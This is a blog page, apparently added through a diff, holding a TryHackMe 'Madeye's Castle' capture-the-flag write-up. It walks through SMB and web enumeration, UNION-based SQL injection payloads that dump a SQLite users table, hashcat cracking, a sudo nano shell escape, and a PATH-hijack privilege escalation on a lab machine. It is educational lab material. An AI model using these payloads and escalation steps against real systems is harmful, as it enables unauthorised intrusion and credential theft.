@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Tryhackme Madeye's Castle | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Tryhackme Madeye’s Castle | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Tryhackme Madeye’s Castle" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here https://tryhackme.com/room/madeyescastle" />
+<meta property="og:description" content="Introduction in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here https://tryhackme.com/room/madeyescastle" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/thm-madeye-castle/bg.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-10T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/thm-madeye-castle/bg.png" />
+<meta property="twitter:title" content="Tryhackme Madeye’s Castle" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Tryhackme Madeye’s Castle","dateModified":"2021-02-10T00:00:00-06:00","description":"Introduction in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here https://tryhackme.com/room/madeyescastle","datePublished":"2021-02-10T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-tryhackme-madeye-castle/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-tryhackme-madeye-castle/","image":"/assets/thm-madeye-castle/bg.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Tryhackme Madeye's Castle</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-10">10 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/thm-madeye-castle/bg.png" alt="Tryhackme Madeye's Castle">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+      <li><a href="#smb">SMB</a></li>
+      <li><a href="#gobuster">Gobuster</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploit">Exploit</a>
+    <ul>
+      <li><a href="#sql-injection">SQL Injection</a></li>
+    </ul>
+  </li>
+  <li><a href="#cracking-hash">Cracking Hash</a></li>
+  <li><a href="#user-escalation">User escalation</a>
+    <ul>
+      <li><a href="#user1">User1</a></li>
+      <li><a href="#user2">User2</a></li>
+      <li><a href="#exploit-root">Exploit Root</a></li>
+    </ul>
+  </li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here <a href="https://tryhackme.com/room/madeyescastle">https://tryhackme.com/room/madeyescastle</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<p>what we have to do first is scanning the ip :</p>
+<blockquote>
+  <p>$ sudo nmap -sC -sV 10.10.185.66</p>
+</blockquote>
+
+<pre><code class="language-bat"># Nmap 7.91 scan initiated Mon Feb  1 13:01:15 2021 as: nmap -sC -sV -oA nmap hogwarts-castle.thm
+Nmap scan report for hogwarts-castle.thm (10.10.128.52)
+Host is up (0.34s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
+|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
+|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -4s, deviation: 1s, median: -5s
+|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: hogwartz-castle
+|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
+|   Domain name: \x00
+|   FQDN: hogwartz-castle
+|_  System time: 2021-02-01T06:01:41+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-01T06:01:41
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb  1 13:02:26 2021 -- 1 IP address (1 host up) scanned in 70.50 seconds
+</code></pre>
+<h3 id="smb">SMB</h3>
+<p>As you can see in nmap we have port open 139,445 which is it is smb share, then lets using smbmap for enumration smb</p>
+
+<pre><code class="language-bat">smbmap -H 10.10.185.66 -R                                                                                                                                   130 ⨯
+[+] Guest session       IP: 10.10.185.66:445    Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        sambashare                                              READ ONLY       Harry's Important Files
+        .\sambashare\*
+        dr--r--r--                0 Thu Nov 26 08:19:19 2020    .
+        dr--r--r--                0 Thu Nov 26 07:57:55 2020    ..
+        fr--r--r--              874 Thu Nov 26 08:06:32 2020    spellnames.txt
+        fr--r--r--              147 Thu Nov 26 08:19:19 2020    .notes.txt
+        IPC$                                                    NO ACCESS       IPC Service (hogwartz-castle server (Samba, Ubuntu))
+</code></pre>
+<p>There is some share with default setting which is everyone can access it.</p>
+<pre><code class="language-bat">smbclient //10.10.185.66/sambashare                                                                        1 ⨯
+Enter WORKGROUP\razor's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Nov 26 08:19:20 2020
+  ..                                  D        0  Thu Nov 26 07:57:55 2020
+  spellnames.txt                      N      874  Thu Nov 26 08:06:32 2020
+  .notes.txt                          H      147  Thu Nov 26 08:19:19 2020
+
+                9219412 blocks of size 1024. 4413488 blocks available
+smb: \&gt; get spellnames.txt
+getting file \spellnames.txt of size 874 as spellnames.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+smb: \&gt; get .notes.txt 
+getting file \.notes.txt of size 147 as .notes.txt (0.1 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+
+</code></pre>
+<p>now we have 2 file from smbshare lets checkit</p>
+<ul>
+  <li>spellnames.txt
+    <pre><code>avadakedavra
+crucio
+imperio
+-
+-
+-
+incendio
+evanesco
+aguamenti
+</code></pre>
+  </li>
+  <li>.notes.txt
+    <pre><code>Hagrid told me that spells names are not good since they will not "rock you"
+Hermonine loves historical text editors along with reading old books.
+</code></pre>
+    <h3 id="gobuster">Gobuster</h3>
+  </li>
+</ul>
+
+<p>now after enumeration we can scanning webserver especially for directory open</p>
+<pre><code class="language-bat">gobuster dir -u 10.10.185.66 -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.185.66
+[+] Threads:        10
+[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/10 18:27:24 Starting gobuster
+===============================================================
+/backup (Status: 301)
+</code></pre>
+<p>if you dont have wordlist you can download right here : <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>
+
+<ul>
+  <li>we found backup directory, now lets scan again to directory backup (“-u 10.10.185.66/backup “)
+    <pre><code>2021/02/10 18:31:43 Starting gobuster
+===============================================================
+/email (Status: 200)
+</code></pre>
+    <p>then we found email, lets check it</p>
+  </li>
+</ul>
+
+<p><img src="/assets/thm-madeye-castle/bg_2.png" alt="Background" />
+we have message from this directory, then lets check the source code webserver</p>
+
+<p><img src="/assets/thm-madeye-castle/bg_3.png" alt="Background" /></p>
+
+<p>We found hosts on source code, now lets put this on /etc/hosts</p>
+<pre><code class="language-bat">$ sudo nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       Razor
+
+10.10.185.66 hogwartz-castle.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+<p>now lets go to http://hogwartz-castle.thm
+<img src="/assets/thm-madeye-castle/bg_4.png" alt="Background" /></p>
+
+<p>then we found login form</p>
+<h2 id="exploit">Exploit</h2>
+<p>First i’m try to using sql map doesn’t working but there give us some hint.</p>
+<h3 id="sql-injection">SQL Injection</h3>
+<p><img src="/assets/thm-madeye-castle/sql.png" alt="Background" /></p>
+
+<p>lets check manually and to make it easier we can use burp suite like this :</p>
+
+<p><img src="/assets/thm-madeye-castle/bg_5.png" alt="Background" /></p>
+
+<p>then send it to repeater</p>
+
+<p><img src="/assets/thm-madeye-castle/bg_6.png" alt="Background" /></p>
+
+<p>in sqlmap give the hint that is UNION injectable with 4 colloums, now put command sql injection to username :</p>
+
+<pre><code>razor' UNION ALL SELECT NULL,NULL,NULL,NULL--
+</code></pre>
+<p>and here the result : 
+<img src="/assets/thm-madeye-castle/sql_2.png" alt="Background" /></p>
+
+<p>here I am trying to send null values to 4 columns and get an error, so there are 4 columns where column 1 and 4 are injectable username and password. we can identify the column for the user and password in 1 and 4. The result :</p>
+<pre><code>razor' UNION ALL SELECT 1,2,3,4--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_1.png" alt="Background" /></p>
+
+<p>After that we can check the version in column 1 or 4 or both. if you don’t know that you can read in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification">here</a> and command for sqlite in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">here</a> . then using this command :</p>
+
+<pre><code>razor'UNION ALL SELECT sqlite_version(),2,3,sqlite_version()--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_3.png" alt="Background" /></p>
+
+<p>then lets find table name : <code>users</code>, to find that you need this command :</p>
+
+<pre><code>razor' UNION ALL SELECT sql,2,3,4 FROM sqlite_master WHERE tbl_name= 'users' AND type = 'table'--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_4.png" alt="Background" /></p>
+
+<p>Now we find the contents of all the column including username, password, admin, and notes . but the problem is we can only see 1 username and 1 password, and I tried selecting everything from table using * and the result was an error</p>
+
+<pre><code>razor' UNION ALL SELECT name,2,3,password FROM users--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_5.png" alt="Background" /></p>
+
+<p>but if we check the columns of table we have 40 colomns which is there are a lot of user and password</p>
+
+<pre><code>razor'UNION ALL SELECT COUNT(name),2,3,COUNT(password) FROM users--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_6.png" alt="Background" /></p>
+
+<p>now after i’m searching and I found this article <a href="https://sqlite.org/lang_aggfunc.html">here</a> which helps me to extract the contents from the table column. in that site we can use group_concat() to see all of table :</p>
+
+<pre><code>razor'UNION ALL SELECT group_concat(name),2,3,COUNT(password) FROM users--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_7.png" alt="Background" /></p>
+
+<p>And for The notes :</p>
+<pre><code>razor'UNION ALL SELECT group_concat(notes),2,3,COUNT(password) FROM users--
+</code></pre>
+<p><img src="/assets/thm-madeye-castle/sql_8.png" alt="Background" /></p>
+
+<p>now when we align the name and notes it will look like this :</p>
+
+<p><img src="/assets/thm-madeye-castle/sql_9.png" alt="Background" /></p>
+
+<p>from the picture we can conclude that user harry uses a password with best64</p>
+
+<h2 id="cracking-hash">Cracking Hash</h2>
+
+<ul>
+  <li>first we have file <code>spellnames.txt</code></li>
+  <li>then we have a hint that the password used is best64 where we can use the best64 hashcat rule
+    <pre><code>hashcat -D 2 --stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt new_crackabel
+</code></pre>
+  </li>
+  <li>Indentify type of hash
+    <pre><code>hash-identifier b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
+--------------------------------------------------
+Possible Hashs:
+[+] SHA-512
+[+] Whirlpool
+Least Possible Hashs:
+[+] SHA-512(HMAC)
+[+] Whirlpool(HMAC)
+--------------------------------------------------
+</code></pre>
+  </li>
+</ul>
+
+<p>Now we just crack the password</p>
+
+<pre><code class="language-bat">$ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabel
+hashcat (v6.1.1) starting...
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+* Device #2: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+CUDA API (CUDA 11.2)
+====================
+* Device #1: GeForce GTX 950, 1501/2001 MB, 6MCU
+
+OpenCL API (OpenCL 1.2 CUDA 11.2.136) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #2: GeForce GTX 950, skipped
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+=============================================================================================================================
+* Device #3: pthread-Intel(R) Pentium(R) Gold G5400 CPU @ 3.70GHz, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+INFO: All hashes found in potfile! Use --show to display them.
+
+Started: Wed Feb 10 22:48:58 2021
+Stopped: Wed Feb 10 22:48:59 2021
+
+$ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabel --show
+b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
+
+</code></pre>
+<h2 id="user-escalation">User escalation</h2>
+
+<h3 id="user1">User1</h3>
+
+<p>Now we have first user, now lets jump in to ssh :</p>
+<pre><code class="language-bat">ssh harry@10.10.185.66
+
+harry@hogwartz-castle:~$ id
+uid=1001(harry) gid=1001(harry) groups=1001(harry)
+harry@hogwartz-castle:~$ ls
+user1.txt
+harry@hogwartz-castle:~$ cat user1.txt 
+RME{t----------------------------------c}
+harry@hogwartz-castle:~$ 
+</code></pre>
+<h3 id="user2">User2</h3>
+
+<p>now lets check privilage of harry</p>
+<pre><code>harry@hogwartz-castle:~$ sudo -l
+[sudo] password for harry: 
+Matching Defaults entries for harry on hogwartz-castle:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User harry may run the following commands on hogwartz-castle:
+    (hermonine) /usr/bin/pico
+    (hermonine) /usr/bin/pico
+harry@hogwartz-castle:~$ 
+</code></pre>
+<p>Then check /usr/bin/pico and its a nano, now we can exploit it to user hermonine and use gtfobins <a href="https://gtfobins.github.io/gtfobins/nano/#sudo">here</a></p>
+<pre><code>sudo -u hermonine /usr/bin/pico
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre>
+<p>here the shell condition is not good but it doesn’t matter and we can still use it</p>
+<pre><code>$ cd
+sh: 6: cd: can't cd to /home/harry
+$ bash -i               
+bash: /home/harry/.bashrc: Permission denied
+hermonine@hogwartz-castle:~$ export TERM=xterm
+hermonine@hogwartz-castle:~$ cd /home/hermonine/
+hermonine@hogwartz-castle:/home/hermonine$ ls
+user2.txt
+hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt 
+RME{p--------------------------------------6}
+hermonine@hogwartz-castle:/home/hermonine$ id
+uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
+hermonine@hogwartz-castle:/home/hermonine$
+</code></pre>
+<h3 id="exploit-root">Exploit Root</h3>
+
+<p>Lets check SUID permission with this command :</p>
+<pre><code class="language-bat">hermonine@hogwartz-castle:/home/hermonine$ find / -perm -u=s -type f 2&gt;/dev/null
+/srv/time-turner/swagger
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/mount
+hermonine@hogwartz-castle:/home/hermonine$
+</code></pre>
+<p>then we have found swagger access for the hermonine user,
+now if you dont know how to get swagger to your machine you can read here :</p>
+<pre><code>first you can copy that to /tmp 
+and you can use scp tools and following this 
+
+Victim : 
+
+hermonine@hogwartz-castle:/home/hermonine$ cp /srv/time-turner/swagger /tmp
+hermonine@hogwartz-castle:/home/hermonine$ cd /tmp/
+hermonine@hogwartz-castle:/tmp$ ls
+swagger
+
+Hacker (Your Machines):
+
+$ scp harry@10.10.185.66:/tmp/swagger ./swagger 
+harry@10.10.185.66's password: 
+swagger                                                                          100% 8816    24.3KB/s   00:00
+</code></pre>
+
+<p>then we can use ghidra for see main function of swagger, lets check in function section main :</p>
+
+<pre><code class="language-bat">undefined8 main(void)
+
+{
+  time_t tVar1;
+  long in_FS_OFFSET;
+  uint local_18;
+  uint local_14;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  local_14 = rand();
+  printf("Guess my number: ");
+  __isoc99_scanf(&amp;DAT_00100b8d,&amp;local_18);
+  if (local_14 == local_18) {
+    impressive();
+  }
+  else {
+    puts("Nope, that is not what I was thinking");
+    printf("I was thinking of %d\n",(ulong)local_14);
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+</code></pre>
+<p>Check in function section impresive :</p>
+<pre><code class="language-bat">void impressive(void)
+
+{
+  setregid(0,0);
+  setreuid(0,0);
+  puts("Nice use of the time-turner!");
+  printf("This system architecture is ");
+  fflush(stdout);
+  system("uname -p");
+  return;
+}
+</code></pre>
+<p>The logic of this program is that when you guess the correct number, the impresive () function will execute the uname command and,here we can execute the binary “uname -p” which is where we can manipulate path variables and can pass malicious code
+resource for rand() <a href="https://man7.org/linux/man-pages/man3/rand.3.html">here</a></p>
+
+<p><a href="https://www.programiz.com/cpp-programming/library-function/cstdlib/srand">srand()</a> : The srand() function in C++ seeds the pseudo random number generator used by the rand() function. The seed for rand() function is 1 by default. It means that if no srand() is called before rand(), the rand() function behaves as if it was seeded with srand(1) and the rand() value always generated same.</p>
+
+<p><a href="https://www.geeksforgeeks.org/time-function-in-c/">time()</a> : The time() function is defined in time.h (ctime in C++) header file. This function returns the time since 00:00:00 UTC, January 1, 1970 (Unix timestamp) in seconds</p>
+
+<p>lets executes a binary called uname ,  if we run swagger program with same logic we get the same value multiple time.</p>
+<pre><code>hermonine@hogwartz-castle:/tmp$ for i in $(seq 1 10);do echo "razor" | ./swagger ;done;
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1144253117
+hermonine@hogwartz-castle:/tmp$
+</code></pre>
+<p>when stopping the rand () function. The first time you need to do is take the first executable rand () value and enter the second execute value.
+now lets create binary at /tmp and add /tmp to $PATH, doing this for getting root privilage using path variable</p>
+<pre><code>hermonine@hogwartz-castle:/tmp$ touch uname
+hermonine@hogwartz-castle:/tmp$ echo "sudo usermod -aG sudo harry" &gt; uname
+hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
+hermonine@hogwartz-castle:/tmp$ chmod +x uname
+</code></pre>
+<p>that code in will add user harry to sudo group when /srv/time-turner/swagger will be executed</p>
+
+<pre><code>hermonine@hogwartz-castle:/tmp$ /srv/time-turner/swagger|grep -Eo '[^ ]+$' |tail -1| /srv/time-turner/swagger 
+whoami
+Guess my number: Nice use of the time-turner!
+This system architecture is hermonine@hogwartz-castle:/tmp$ su harry
+Password: 
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+harry@hogwartz-castle:/tmp$ sudo su root
+[sudo] password for harry: 
+root@hogwartz-castle:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@hogwartz-castle:/tmp# cat /root/root.txt 
+RME{M------------------------------f}
+root@hogwartz-castle:/tmp#
+</code></pre>
+<p>Happy Hacking :D</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Tryhackme Madeye's Castle&url=/writeup-tryhackme-madeye-castle/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-tryhackme-madeye-castle/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-tryhackme-madeye-castle/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Tryhackme">Tryhackme</a>                
+    
+
